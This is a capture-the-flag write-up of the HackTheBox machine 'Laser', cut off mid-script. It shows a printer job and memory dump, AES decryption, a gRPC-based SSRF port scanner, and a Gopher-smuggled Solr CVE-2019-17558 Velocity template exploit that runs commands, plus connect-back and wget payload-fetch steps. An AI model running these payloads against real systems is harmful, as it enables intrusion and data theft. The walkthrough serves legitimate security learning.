---
title: HTB: Laser
url: https://0xdf.gitlab.io/2020/12/19/htb-laser.html
date: 2020-12-19T14:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, hackthebox, htb-laser, nmap, ubuntu, jetdirect, pret, printer, crypto, python, proto3, grpc, solr, cve-2019-17558, gopher, pspy, sshpass, socat, tunnel, htb-playertwo, htb-travel
---

![Laser](https://0xdfimages.gitlab.io/img/laser-cover.png)

Laser starts without the typical attack paths, offering only SSH and two unusual ports. One of those is a printer, which gives the opportunity to leak data including a print job and the memory with the encryption key for that job. The PDF gives details of how the second port works, using protocol buffers over gRPC. I’ll use this spec to write my own client, and use that to build a port scanner and scan the box for other open ports on localhost. When I find Apache Solr, I’ll use create another exploit to go through the gRPC service and send a POST request using Gopher to exploit Solr and get code execution and a shell. To escalate to root, I’ll collect SSH credentials for the root user in a container, and then use socat to redirect a cron SCP and SSH job back at the host box and exploit that to get code execution and root.

## Box Info

| Name | [Laser](https://hackthebox.com/machines/laser)  [Laser](https://hackthebox.com/machines/laser) [Play on HackTheBox](https://hackthebox.com/machines/laser) |
| --- | --- |
| Release Date | [08 Aug 2020](https://twitter.com/hackthebox_eu/status/1291410874155044864) |
| Retire Date | 19 Dec 2020 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Laser |
| Radar Graph | Radar chart for Laser |
| First Blood User | 00:04:04[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 23:18:35[bjornmorten bjornmorten](https://app.hackthebox.com/users/119497) |
| Creators | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531)  [R4J R4J](https://app.hackthebox.com/users/13243) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22) and two unidentified services (9000 and 9100):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.201
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-09 15:25 EDT
Nmap scan report for 10.10.10.201
Host is up (0.019s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
9000/tcp open  cslistener
9100/tcp open  jetdirect

Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
root@kali# nmap -p 22,9000,9100 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.201
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-09 15:28 EDT
Nmap scan report for 10.10.10.201
Host is up (0.014s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
9000/tcp open  cslistener?
9100/tcp open  jetdirect?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.80%I=7%D=9/9%Time=5F592CF2%P=x86_64-pc-linux-gnu%r(NUL
SF:L,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\
...[snip]...
SF:x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.59 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 Focal.

### JetDirect - TCP 9100

#### It’s a Printer

With nothing else to go on, I googled “jetdirect” (what `nmap` labeled this port as), and found that it’s related to [HP printers](https://en.wikipedia.org/wiki/JetDirect), and typically listens on TCP 9100. Given the name of the box, laser, that seems like a good fit.

To test the theory, I used the Printer Exploitation Toolkit, or [PRET](https://github.com/RUB-NDS/PRET), designed to take a series of commands through a UNIX-like prompt and translate them into one of three protocols that are supported by most laser printers, PostScript, PJL, and PCL.

#### Choose Protocol

To run `pret.py`, I just give it the IP and the protocol. Not knowing the protocol, I tried all three. There were varying levels of success, but `pjl` was the cleanest, clearly showing a device type:

```

root@kali# python /opt/PRET/pret.py 10.10.10.201 pjl
      ________________                                             
    _/_______________/|                                            
   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> 
  |           |   ô| ||                                            
  |___________|   ô| ||                                            
  | ||/.´---.||    | ||      「 pentesting tool that made          
  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
  |_||=L==H==||_|__|/                                              
                                                                   
     (ASCII art by                                                 
     Jan Foerster)                                                 
                                                                   
Connection to 10.10.10.201 established
Device:   LaserCorp LaserJet 4ML

Welcome to the pret shell. Type help or ? to list commands.
10.10.10.201:/>

```

#### Commands

The help menu is useful here to see what commands are available:

```
10.10.10.201:/> ?

Available commands (type help <topic>):
=======================================
append  delete    edit    free  info    mkdir      printenv  set        unlock 
cat     destroy   env     fuzz  load    nvram      put       site       version
cd      df        exit    get   lock    offline    pwd       status   
chvol   disable   find    help  loop    open       reset     timeout  
close   discover  flood   hold  ls      pagecount  restart   touch    
debug   display   format  id    mirror  print      selftest  traversal

```

I’ll come back to this over and over again.

#### Find Job

I’ll look around this “filesystem” to see what’s there using `ls`:

```
10.10.10.201:/> ls
d        -   pjl

```

The `d` means this is a directory named `pjl`. Going into it, there’s another directory named `jobs`:

```
10.10.10.201:/> cd pjl
10.10.10.201:/pjl> ls
d        -   jobs

```

In `jobs`, there’s a “file” named `queued`:

```
10.10.10.201:/pjl> cd jobs/
10.10.10.201:/pjl/jobs> ls
-   172199   queued

```

The help menu showed a `get` command, and it works to download the data to my host:

```
10.10.10.201:/pjl/jobs> get queued
172199 bytes received.

```

#### queued

The file is a long, single ASCII line that looks base64-encoded wrapped in a Python-like byte string (`b' '`) and with two Windows newlines at the end:

```

root@kali# file queued
queued: ASCII text, with very long lines, with CRLF line terminators
root@kali# head -c 100 queued
b'VfgBAAAAAADOiDS0d+nn3sdU24Myj/njDqp6+zamr0JMcj84pLvGcvxF5IEZAbjjAHnfef9tCBj4u+wj/uGE1BLmL3Mtp/YL+w

```

I made a copy of the file, removed the `b'` from the front and a `'^M^M` from the end with `vim`, and then decoded it:

```

root@kali# cp queued queued.b64
root@kali# vim queued.b64 
root@kali# cat queued.b64 | base64 -d | less
root@kali# cat queued.b64 | base64 -d > queued.raw

```

The resulting data is just data, with no known file type or association:

```

root@kali# xxd queued.raw | head
00000000: 55f8 0100 0000 0000 ce88 34b4 77e9 e7de  U.........4.w...
00000010: c754 db83 328f f9e3 0eaa 7afb 36a6 af42  .T..2.....z.6..B
00000020: 4c72 3f38 a4bb c672 fc45 e481 1901 b8e3  Lr?8...r.E......
00000030: 0079 df79 ff6d 0818 f8bb ec23 fee1 84d4  .y.y.m.....#....
00000040: 12e6 2f73 2da7 f60b fb08 955c 3e4c 28a9  ../s-......\>L(.
00000050: 9d7a fbc4 8483 8d54 d050 bf6e b24f 0759  .z.....T.P.n.O.Y
00000060: 14f6 2b70 f4c2 f415 ea93 fbf0 cdf4 7705  ..+p..........w.
00000070: 6a03 45a8 f3c8 b59c 6a1f 133a e82d 5e5d  j.E.....j..:.-^]
00000080: 2776 6570 61a8 d4d0 bbd2 b60b 29bd 7206  'vepa.......).r.
00000090: b239 7c55 6151 8bf9 1026 bf98 b006 f695  .9|UaQ...&......

```

#### Encryption

[This page](https://support.hp.com/in-en/document/c05390053) talks about configuring printers to encrypt jobs while they are on the printer. There were a few important parts. First, the encryption is AES-128 or AES-256:

> Algorithms to encrypt job data for devices with eMMC/SSD (no HDD):
>
> - **AES-128 (less secure, normal system performance)**
> - **AES-256 (more secure, decreases system performance)**

Second, the keys are stored in memory:

> The printer encryption keys are randomly generated when the product is started and securely stored in a protected memory area.

The help menu for PRET had a command, `nvram`, which has an option to dump all RAM to a file:

```
10.10.10.201:/pjl/jobs> nvram
NVRAM operations:  nvram <operation>
  nvram dump [all]         - Dump (all) NVRAM to local file.
  nvram read addr          - Read single byte from address.
  nvram write addr value   - Write single byte to address.

```

On running, at the very end is an interesting reference to a key:

```
10.10.10.201:/> nvram dump                                                          
Writing copy to nvram/10.10.10.201
.........................................................................................................................................................................
.........................................................................................................................................................................
.........................................................................................................................................................................
.........................................................................................................................................................................
.........................................................................................................................................................................
.........................................................................................................................................................................
............................................................................k...e....y.....13vu94r6..643rv19u

```

#### Decrypt File

At this point I have a string that’s associated with the key: `13vu94r6..643rv19u`, and I have a blob that looks like encrypted data using AES. It took me a long time of frustrating trial and error, but I figured out two things.
1. The key is actually `13vu94r6643rv19u`. This makes some sense since it is now exactly 16 bytes, which fits the expected key size. I’m not sure why those two dots show up in the middle of the string.
2. I expected the first 16 bytes of the blob to be the IV. But pulling those out wasn’t working for me. Looking at a hexdump of the file, there was something weird about the first eight bytes:

   ```

   root@kali# xxd queued.raw  | head
   00000000: 55f8 0100 0000 0000 ce88 34b4 77e9 e7de  U.........4.w...
   00000010: c754 db83 328f f9e3 0eaa 7afb 36a6 af42  .T..2.....z.6..B
   00000020: 4c72 3f38 a4bb c672 fc45 e481 1901 b8e3  Lr?8...r.E......
   00000030: 0079 df79 ff6d 0818 f8bb ec23 fee1 84d4  .y.y.m.....#....
   00000040: 12e6 2f73 2da7 f60b fb08 955c 3e4c 28a9  ../s-......\>L(.
   00000050: 9d7a fbc4 8483 8d54 d050 bf6e b24f 0759  .z.....T.P.n.O.Y
   00000060: 14f6 2b70 f4c2 f415 ea93 fbf0 cdf4 7705  ..+p..........w.
   00000070: 6a03 45a8 f3c8 b59c 6a1f 133a e82d 5e5d  j.E.....j..:.-^]
   00000080: 2776 6570 61a8 d4d0 bbd2 b60b 29bd 7206  'vepa.......).r.
   00000090: b239 7c55 6151 8bf9 1026 bf98 b006 f695  .9|UaQ...&......

   ```

   The IV should be random, but this one ends with five null bytes. Eventually I tried ditching the first eight bytes, pulling bytes 8-23 as the IV, and then the rest as cipher text. That worked.

With those two things in mind, this script takes the initial unmodified `queued` file and decrypts it:

```

#!/usr/bin/env python3

import base64
from Crypto.Cipher import AES

with open('queued', 'r') as f:
    instr = f.read()

data = instr.split("'")[1]
raw = base64.b64decode(data)

iv = raw[8:24]
cipher = raw[24:]

aes = AES.new(b'13vu94r6643rv19u', AES.MODE_CBC, iv)
plain = aes.decrypt(cipher)

with open('queued.pdf', 'wb') as f:
    f.write(plain)

```

In testing to get something to work, I didn’t include the last two lines to write the output to a file, but rather ran it as `python3 -i decrypt.py`, and the `-i` would have it drop to an interactive Python prompt at the end of the script. Then I could check `plain`:

```

>>> plain[:24]
b'%PDF-1.4\n%\xd3\xeb\xe9\xe1\n1 0 obj\n<'

```

When I got the output above, I knew it was decrypting correctly and it was a PDF file:

![image-20200910072329779](https://0xdfimages.gitlab.io/img/image-20200910072329779.png)

### Feed Engine - TCP 9000

#### Document

I couldn’t get port 9000 to respond at all, but the document I collected from the printer contains details describing a custom service, Feed Engine v1.0, which “runs on 9000 port by default”. The goal is to “parse the feeds from various sources (Printers, Network devices, Web servers and other connected devices). These feeds can be used in checking load balancing, health status, tracing.”

Important take-aways from the document:
- The system is built on Protocol Buffers and gRPC.
  - I looked at Protocol Buffers before in [Player Two](/2020/06/27/htb-playertwo.html#twirp-api---tcp-8545). The “Usage” section gives the information to make the `.proto` file.
  - gRPC is new to me, but I can guess it’s likely the service listening on port 9000 that I’ll need to interact with.
- Deviced should be submitted as a JSON object with an example provided.
- Devices should be submitted “in serialized format”. Later, in the “QA with Clients” section, the senior developer mentions `pickle`, the Python serialization library:

  > Well, we placed controls on what gets unpickled. We don’t use builtins and any other modules.

  The implication here is that this is not a deserialization attack. I may look at that anyway.
- There’s a domain name in the example feed information - `printer.laserinternal.htb`. I’ll add both that and `laserinternal.htb` to my `/etc/hosts` file.
- In the final section, “Todo”, the last bullet is “4. Merge staging core to feed engine”. It will be important to know there’s a core named staging later.

#### Background

grpc.io has a good [Introduction to gRPC](https://grpc.io/docs/what-is-grpc/introduction/) guide. gRPC uses protocol buffers to define interfaces and the messages that are exchanged, allowing clients and a server written in different languages to seamlessly communicate. Because `pickle` serialized data was mentioned, I’ll write in Python. grpc.io has a [Tutorial for many languages, including Python](https://grpc.io/docs/languages/python/basics/) that I’ll base my code on. I’ll also use the [Google tutorial](https://developers.google.com/protocol-buffers/docs/pythontutorial). An example `.proto` file can be found in this example project on the [grpc GitHub](https://github.com/grpc/grpc/blob/v1.31.0/examples/protos/route_guide.proto).

To talk to Feed Engine, first I’ll need a `.proto` file that defines the interface and messages. I can then use the `grpc_tools.protoc` Python module to generate Python files that I can import into my client that will handle the specific methods from the `.proto` file. Next, I’ll need to write a client that uses those files to make calls into the system.

#### Generate Protobuff

I’ll start with creating a Protocol Buffer (`.proto`) file based on the descriptions in the document:

> We defined a Print service which has a RPC method called Feed . This method takes Content
> as input parameter and returns Data from the server.
> The Content message definition specifies a field data and Data message definition specifies a
> field feed .
> On successful data transmission you should see a message.

I’ll create my `.proto` file as follows to match that:

```

syntax = "proto3";

service Print {
    rpc Feed(Content) returns (Data) {}
}

message Content {
    string data = 1;
}

message Data {
    string feed = 1;
}

```

When defining variables in a message, each should have a [unique integer number](https://developers.google.com/protocol-buffers/docs/proto3#assigning_field_numbers).

To build the necessary Python files, I’ll need the `grpcio-tools` package (`python3 -m pip install grpcio-tools`), and then I can run:

```

root@kali# python3 -m grpc_tools.protoc -I . --python_out=. --grpc_python_out=. feedengine.proto
/usr/lib/python3.8/runpy.py:127: RuntimeWarning: 'grpc_tools.protoc' found in sys.modules after import of package 'grpc_tools', but prior to execution of 'grpc_tools.protoc'; this may result in unpredictable behaviour
  warn(RuntimeWarning(msg))

```

Now there are two new Python files, `feedengine_pb2.py` and `feedengine_pb2_grpc.py`:

```

root@kali# ls
feedengine_pb2_grpc.py  feedengine_pb2.py  feedengine.proto

```

Those files define classes that I can import into a client. There’s a class in `feedengine_pb2_gprc.py` called `PrintStub` (print from the service I defined in the Protobuf file):

```

class PrintStub(object):
    """Missing associated documentation comment in .proto file."""

    def __init__(self, channel):
        """Constructor.

        Args:
            channel: A grpc.Channel.
        """
        self.Feed = channel.unary_unary(
                '/Print/Feed',
                request_serializer=feedengine__pb2.Content.SerializeToString,
                response_deserializer=feedengine__pb2.Data.FromString,
                )

```

#### Create Client

Following the [tutorial](https://grpc.io/docs/languages/python/basics/#client), first I need to create a stub by importing the files I just created, creating a `channel`, and passing that to the `PrintStub`:

```

import base64
import grpc
import pickle
import feedengine_pb2
import feedengine_pb2_grpc

payload = """{
    "version": "v1.0",
    "title": "Printer Feed",
    "home_page_url": "http://printer.laserinternal.htb/",
    "feed_url": "http://printer.laserinternal.htb/feeds.json",
    "items": [
        {
            "id": "2",
            "content_text": "Queue jobs"
        },
        {
            "id": "1",
            "content_text": "Failed items"
        }
    ]
}"""

channel = grpc.insecure_channel('10.10.10.201:9000')
stub = feedengine_pb2_grpc.PrintStub(channel)
payload_ser = pickle.dumps(payload)
content = feedengine_pb2.Content(data=payload_ser)
response = stub.Feed(content)
print(response)

```

When I ran this, it failed:

```

root@kali# python3 feedengine_client.py 
Traceback (most recent call last):
  File "feedengine_client.py", line 32, in <module>
    content = feedengine_pb2.Content(data=payload_ser)
ValueError: b'\x80\x04\x95w\x01\x00\x00\x00\x00\x00\x00Xp\x01\x00\x00{\n    "version": "v1.0",\n    "title": "Printer Feed",\n    "home_page_url": "http://printer.laserinternal.htb/",\n    "feed_url": "http://printer.laserinternal.htb/feeds.json",\n    "items": [\n        {\n            "id": "2",\n            "content_text": "Queue jobs"\n        },\n        {\n            "id": "1",\n            "content_text": "Failed items"\n        }\n    ]\n}\x94.' has type str, but isn't valid UTF-8 encoding. Non-UTF-8 strings must be converted to unicode objects before being added.

```

It is a `ValueError` trying to read what is clearly the serialized payload. The server is expecting a string. I tried to make it unicode, but didn’t have much luck. Eventually I tried base64:

```

channel = grpc.insecure_channel('10.10.10.201:9000')
stub = feedengine_pb2_grpc.PrintStub(channel)
payload_ser = base64.b64encode(pickle.dumps(payload))
content = feedengine_pb2.Content(data=payload_ser)
response = stub.Feed(content)
print(response)

```

It worked (by worked I mean hung for a few seconds and then returned a new error):

```

root@kali# python3 feedengine_client.py 
Traceback (most recent call last):
  File "feedengine_client.py", line 32, in <module>
    response = stub.Feed(content)
  File "/usr/local/lib/python3.8/dist-packages/grpc/_channel.py", line 826, in __call__
    return _end_unary_response_blocking(state, call, False, None)
  File "/usr/local/lib/python3.8/dist-packages/grpc/_channel.py", line 729, in _end_unary_response_blocking
    raise _InactiveRpcError(state)
grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
        status = StatusCode.UNKNOWN
        details = "Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')"
        debug_error_string = "{"created":"@1599764147.724451006","description":"Error received from peer ipv4:10.10.10.201:9000","file":"src/core/lib/surface/call.cc","file_line":1061,"grpc_message":"Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')","grpc_status":2}"
>

```

It looks like I’m getting back an actual response from the service this time:

```

details = "Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')"

```

The lag must have been the server trying to do the DNS resolution and failing.

Some experimenting reveals that the `home_page_url` doesn’t seem to matter (at least not yet), so I’m focusing on the `feed_url`. When I set it to `http://127.0.0.1/feeds.json`, I get a new message back:

```

root@kali# python3 feedengine_client.py 
feed: "Error in retrieving feeds"

```

I set the `feed_url` to point to my host: `http://10.10.14.9/feeds.json`, and started `nc`. On running, I got a request:

```

root@kali# nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.201.
Ncat: Connection from 10.10.10.201:50536.
GET /feeds.json HTTP/1.1
Host: 10.10.14.9
User-Agent: FeedBot v1.0
Accept: */*

```

I then created an empty `feeds.json` file, started a Python webserver, and ran again. I get the hit at the server:

```

root@kali# touch feeds.json
root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.201 - - [10/Sep/2020 16:05:38] "GET /feeds.json HTTP/1.1" 200 -

```

And then I see “Pushing feeds”:

```

root@kali# python3 feedengine_client.py 
feed: "Pushing feeds"

```

This matches the documentation:

> On successful data transmission you should see a message.
>
> ```

> ...
> return service_pb2.Data(feed='Pushing feeds')
> ...
>
> ```

The client seems to work.

## Shell as solr

### Identify Ports

I spent a while trying to figure out what to do with this new client. I went down the road of exploring deserialization bugs without much success. Eventually, I started to think about what I had up to this point - an interface that I can hit on Laser that will cause it to make a web request. A common thing to check from here is what else can I talk to that I couldn’t talk to directly.

When I made the earlier request `http://127.0.0.1/feeds.json`, it returned “Error in retrieving feeds”. I wanted to find a difference between closed and open ports. I checked `http://127.0.0.1:9100`, but got the same return. Eventually I tried `localhost` instead of `127.0.0.1`, and it made a difference. Both port 9100 and 80 crashed, but differently:

```

root@kali# python3 feedengine_client.py # 80
Traceback (most recent call last):
  File "feedengine_client.py", line 32, in <module>
    response = stub.Feed(content)
  File "/usr/local/lib/python3.8/dist-packages/grpc/_channel.py", line 826, in __call__
    return _end_unary_response_blocking(state, call, False, None)
  File "/usr/local/lib/python3.8/dist-packages/grpc/_channel.py", line 729, in _end_unary_response_blocking
    raise _InactiveRpcError(state)
grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
        status = StatusCode.UNKNOWN
        details = "Exception calling application: (7, 'Failed to connect to localhost port 80: Connection refused')"
        debug_error_string = "{"created":"@1599775944.250446124","description":"Error received from peer ipv4:10.10.10.201:9000","file":"src/core/lib/surface/call.cc","file_line":1061,"grpc_message":"Exception calling application: (7, 'Failed to connect to localhost port 80: Connection refused')","grpc_status":2}"
>

root@kali# python3 feedengine_client.py # 9100
Traceback (most recent call last):
  File "feedengine_client.py", line 32, in <module>
    response = stub.Feed(content)
  File "/usr/local/lib/python3.8/dist-packages/grpc/_channel.py", line 826, in __call__
    return _end_unary_response_blocking(state, call, False, None)
  File "/usr/local/lib/python3.8/dist-packages/grpc/_channel.py", line 729, in _end_unary_response_blocking
    raise _InactiveRpcError(state)
grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
        status = StatusCode.UNKNOWN
        details = "Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')"
        debug_error_string = "{"created":"@1599775916.735603335","description":"Error received from peer ipv4:10.10.10.201:9000","file":"src/core/lib/surface/call.cc","file_line":1061,"grpc_message":"Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')","grpc_status":2}"
>

```

Port 80 returned an error of “Failed to connect to localhost port 80: Connection refused”, whereas port 9100 returned an error of “Received HTTP/0.9 when not allowed”. I can work with this.

I’ll re-write the script to try all the ports on localhost and see which respond:

```

#!/usr/bin/env python3

import base64
import grpc
import pickle
import sys
import feedengine_pb2
import feedengine_pb2_grpc

payload = """{{
    "version": "v1.0",
    "title": "Printer Feed",
    "home_page_url": "",
    "feed_url": "http://localhost:{}",
    "items": [
        {{
            "id": "2",
            "content_text": "Queue jobs"
        }},
        {{
            "id": "1",
            "content_text": "Failed items"
        }}
    ]
}}"""

channel = grpc.insecure_channel('10.10.10.201:9000')
stub = feedengine_pb2_grpc.PrintStub(channel)

for port in range(1, 65536):
    print(f'\r{port}', end='', flush=True)
    payload_ser = base64.b64encode(pickle.dumps(payload.format(port)))
    content = feedengine_pb2.Content(data=payload_ser)
    try:
        response = stub.Feed(content)
        print(f'\r[{port:05d}] Open - Resp: {response.feed.strip()}')
    except grpc._channel._InactiveRpcError as ex:
        if not 'Failed to connect to localhost port' in ex.details():
            print(f'\r[{port:05d}] Open - No resp')

print('\rScan Complete')

```

In the `payload` string, I use double `{{}}` for actual brackets and single `{}` so that later when I call `.format` the singles will be replaced with the port and the doubles will become singles.

Then I just loop over all the ports, sending the request, and checking the response. If a feed comes back, I print that with the message. If there’s an error, I check if it’s an error about failing to connect. If it’s anything else, I print that the port is open, but not responding to this request.

```

root@kali# time python3 feedengine_portscan.py
[00022] Open - No resp                                                              
[07983] Open - No resp           
[08983] Open - Resp: Pushing feeds
[09000] Open - No resp                                                              
[09100] Open - No resp
[41671] Open - Resp: Pushing feeds

real    17m3.249s
user    0m29.499s                                                                   
sys     0m11.828s  

```

22, 9000, and 9100 make sense. I’ve already seen those ports, and the fact that they aren’t hosting an HTTP server that can return something is as expected. 7983 is interesting, but I’m not sure what I can do with it at this point. It isn’t registered as anything, and [speedguide.net show it only as malware](https://www.speedguide.net/port.php?port=7983). 41671 is a high port, which [might be associated with some video games](https://www.speedguide.net/port.php?port=41671), but again, not sure where to go with that. 8983 is [registered by IANA](https://www.speedguide.net/port.php?port=8983) as Apache Solr.

### Apache Solr Exploit

#### Solr Background

According to [the website](https://lucene.apache.org/solr/), Apache Solr is:

> A highly reliable, scalable and fault tolerant, providing distributed indexing, replication and load-balanced querying, automated failover and recovery, centralized configuration and more. Solr powers the search and navigation features of many of the world’s largest internet sites.

It provides indexing and searchability for datastores.

#### Solr Exploit - CVE-2019-17558

There’s an exploit in Apache Solr which can be exploited with three (or two) HTTP requests. I first found the [Metasploit Exploit](https://www.exploit-db.com/exploits/48338), which led me to the discovery of a handful of other really useful references:
- [Apache Solr RCE via Velocity Template](https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-templat) [[Translation](https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2Fgithub.com%2FAleWong%2FApache-Solr-RCE-via-Velocity-template&sandbox=1)]
- [xz.aliyun.com](https://xz.aliyun.com/t/6700) [[Translation](https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6700&sandbox=1)]
- [s00py gist with two HTTP requests / responses](https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133/)
- [POC Python script with examples](https://github.com/jas502n/solr_rce)

The exploit breaks down into three parts:
1. Request the list of modules or “cores” from the system with a GET to `/admin/cores`.
2. For each core in the response, send a post to `/solr/[core]/config` with a JSON body that turns on the `VelocityResponseWriter` class.
3. A GET request to `/solar/[core]/select` with parameters that trigger the RCE.

#### Strategy

I suspect this exploit will work here (I don’t have better ideas), but I have a few issues to overcome.
1. In the typical case, the responses to the commands come back in the HTTP requests. But I can’t make a direct HTTP request to the service, but rather only bounce requests through the gRPC instance, which only sends an error or “Pushing feeds”. I’m going to have to do this blind.
2. I need to be able to send a POST request.

To solve the first, I can choose a command like `ping` to test RCE, and then go to a shell. Most exploits do query for the core list first, but since I’m going blind, I can’t grab that. I did get the reference to a “staging core” in the PDF, so I’ll try that. I also have a couple examples in the last two references above, where they use `test` and `atom` as cores. I’ll try those if `staging` doesn’t work.

To solve the second, I’ll use [Gopher](https://en.wikipedia.org/wiki/Gopher_(protocol)). I used this technique in [Travel](/2020/09/12/htb-travel.html#gopher), and showed some of the details of how it works there. At a high level, I can use `gopher://` to send a raw request where I can define all the content (unlike HTTP which adds headers) and all in the url. So I can use Gopher to create a POST request.

#### Local

Because it gets tricky creating HTTP requests from Gopher, I’m going to first have it send requests to me so I can verify they work. Then I’ll change the host.

I created another script which looks a lot like the first two, this time, with the url passed in being a `gopher` payload that will issue a GET request back to my box:

```

#!/usr/bin/env python3

import base64
import grpc
import pickle
import feedengine_pb2
import feedengine_pb2_grpc
from urllib.parse import quote

grpc_payload = """{{
    "version": "v1.0",
    "title": "Printer Feed",
    "home_page_url": "",
    "feed_url": "{url}",
    "items": [
        {{
            "id": "2",
            "content_text": "Queue jobs"
        }},
        {{
            "id": "1",
            "content_text": "Failed items"
        }}
    ]
}}"""

host = "gopher://10.10.14.9:8983/_"
http1 = host + quote("GET /staging/cores HTTP/1.1\n\n", safe='')

channel = grpc.insecure_channel('10.10.10.201:9000')
stub = feedengine_pb2_grpc.PrintStub(channel)
payload_ser = base64.b64encode(pickle.dumps(grpc_payload.format(url=http1)))
content = feedengine_pb2.Content(data=payload_ser)
response = stub.Feed(content)
print(response)

```

When I run this, I get a connection on my Python webserver:

```

root@kali# python3 -m http.server 8983
Serving HTTP on 0.0.0.0 port 8983 (http://0.0.0.0:8983/) ... 
10.10.10.201 - - [11/Sep/2020 17:42:28] code 404, message File not found
10.10.10.201 - - [11/Sep/2020 17:42:28] "GET /admin/cores HTTP/1.1" 404 -

```

Now I’ll try to change it from a GET to a POST and try to match the request in the POCs. I updated the payload to:

```

post = '''POST /solr/test/config HTTP/1.1
Host: localhost:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
'''

host = "10.10.14.9"
target = f"gopher://{host}:8983/_"
http1 = target + quote(post, safe='')

```

I killed the Python webserver and started `nc` on 8983 (so I could see the full POST). When I run it, I get a POST request from Laser, and it looks like what I want:

```

root@kali# nc -lnvp 8983
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8983
Ncat: Listening on 0.0.0.0:8983
Ncat: Connection from 10.10.10.201.
Ncat: Connection from 10.10.10.201:51450.
POST /solr/test/config HTTP/1.1
Host: localhost:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }

```

Now I’ve shown that I can have the feedengine send the POST request necessary to do the Solr exploit. Still sending the requests to my box for testing, I’ll create the second request, the GET. I won’t need Gopher for this, as I can just use HTTP to send the full GET:

```

cmd = 'ping -c 1 10.10.14.9'
http2 = f"http://{host}:8983/solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+        %23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{quote(cmd)}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

```

That Python f-string will allow me to easily change the host and the command, and it does the url-encoding as well.

#### Remote

Up to this point I’ve been sending requests to Laser and having it send two requests back to my host so I could make sure they look right.

Now that I could see the correct requests are being sent, I changed the `host` variable from my IP to `localhost` to the exploit requests would go to Laser and crossed my fingers. It didn’t work. When the first request sends, it hangs for ~60 seconds. Then it prints like it was successful twice.

This took a bunch of troubleshooting to figure out. Eventually I tried breaking it into two scripts, and sending the POST, and while it hangs, sending the GET. It worked! I got a ping. I tend to like to make pretty scripts that work cleanly, but in this case, I left it as two scripts.

### Shell

#### RCE to Shell

Going from RCE (ping) to shell was non-trivial. I could get pings and get `nc` to connect to me (just like `nc 10.10.14.9 443`), but it seemed that characters like `;` and `|` seemed to break execution. I eventually figured out that I could `wget -O` to get a file from my host to Laser, and once I had that, I could get a shell. The two scripts I used to get a shell were:

```

#!/usr/bin/env python3

import base64
import grpc
import pickle
import sys
import feedengine_pb2
import feedengine_pb2_grpc
from urllib.parse import quote

grpc_payload = """{{
    "version": "v1.0",
    "title": "Printer Feed",
    "home_page_url": "",
    "feed_url": "{url}",
    "items": [
        {{
            "id": "2",
            "content_text": "Queue jobs"
        }},
        {{
            "id": "1",
            "content_text": "Failed items"
        }}
    ]
}}"""

post = '''POST /solr/staging/config HTTP/1.1
Host: localhost:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
